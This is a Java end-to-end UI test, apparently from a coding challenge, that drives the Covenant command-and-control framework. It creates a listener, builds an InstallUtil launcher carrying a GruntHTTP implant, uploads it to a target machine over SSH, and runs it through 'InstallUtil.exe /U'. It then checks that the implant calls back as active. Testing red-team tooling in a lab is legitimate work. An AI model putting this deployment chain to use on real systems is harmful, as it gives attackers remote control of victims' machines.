package com.natalya.challenge.covenant.scenario.e2e;

import com.natalya.challenge.covenant.domain.User;
import com.natalya.challenge.covenant.domain.launcher.InstallUtilLauncher;
import com.natalya.challenge.covenant.domain.listener.BridgeListener;
import com.natalya.challenge.covenant.domain.listener.BridgeListener.BridgeProfileType;
import com.natalya.challenge.covenant.scenario.BaseUiTest;
import com.natalya.challenge.covenant.step.grunt.GruntService;
import com.natalya.challenge.covenant.step.launcher.LauncherService;
import com.natalya.challenge.covenant.step.listener.ListenerService;
import com.natalya.challenge.covenant.step.login.LoginService;
import com.natalya.challenge.covenant.util.SshExecutor;
import org.apache.commons.lang3.RandomStringUtils;
import org.testng.Assert;
import org.testng.annotations.Test;

public class E2eTest extends BaseUiTest {

    private final User newUser = new User(RandomStringUtils.randomAlphabetic(5),
            RandomStringUtils.randomAlphabetic(5));

    @Test
    public void happy_path() throws Exception {
        //login as admin
        var loginService = new LoginService(testConfig.getBaseUrl());
        loginService.loginAsUser(new User("admin", "admin"));

        //create new user and re-login
        loginService.createUser(newUser);
        loginService.reLoginAsUser(newUser);

        //create BridgeListener
        var listener = BridgeListener.builder()
                .name("Bridge_Listener_" + RandomStringUtils.randomAlphabetic(5))
                .bindAddress("0.0.0.0")
                .bindPort("7444")
                .connectPort("7445")
                .connectAddress(testConfig.getTargetHostName())
                .profileType(BridgeProfileType.DEFAULT)
                .build();
        new ListenerService().createListener(listener);

        //create InstallUtilLauncher
        var launcher = InstallUtilLauncher.builder()
                .listener(listener.getName())
                .implantTemplate("GruntHTTP")
                .dotNetVersion("Net40")
                .isValidateCert(true)
                .isUseCertPinning(true)
                .delay("5")
                .jitterPercent("10")
                .connectAttempts("5000")
                .killDateInput("09/29/2022 5:33 PM")
                .build();
        var file = new LauncherService(testConfig).createInstallUtilLauncher(launcher);
        Assert.assertNotNull(file, "InstallUtilLauncher has not been saved");

        //upload launcher to the remote machine and run
        SshExecutor executor = new SshExecutor(testConfig.getTargetHostName(), testConfig.getSshUser(),
                testConfig.getSshPassword());
        executor.uploadFileViaSftp(file, "./Documents/" + file.getName());
        executor.runCommandViaSsh("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /U "
                + "C:\\Users\\" + testConfig.getSshUser() + "\\Documents\\" + file.getName());

        Assert.assertTrue(
                new GruntService().getGrunts().stream()
                        .anyMatch(e -> testConfig.getTargetHostName().equals(e.get("Hostname"))
                                && "Active".equals(e.get("Status"))),
                "No connection established with remote host: " + testConfig.getTargetHostName());
    }
}
